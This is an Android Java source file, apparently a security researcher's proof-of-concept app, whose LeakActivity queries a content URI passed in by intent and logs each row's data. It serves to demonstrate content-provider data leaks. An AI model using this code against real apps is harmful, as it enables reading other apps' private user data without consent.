package oversecured.plugin.assassin;

import androidx.appcompat.app.AppCompatActivity;

import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import java.io.FileNotFoundException;

import oversecured.plugin.assassin.R;

public class LeakActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        Uri uri = Uri.parse(getIntent().getDataString());
        Log.d("dsds",uri.toString());
        Cursor aaa = getContentResolver().query(uri,null,null,null,null);
        if (aaa.moveToFirst()){
            do{
                String data1 = aaa.getString(0);
                String data2 = aaa.getString(1);
                Log.d("data",data1);
                Log.d("data",data2);
                // do what ever you want here
            }while(aaa.moveToNext());
        }
        aaa.close();
    }
}


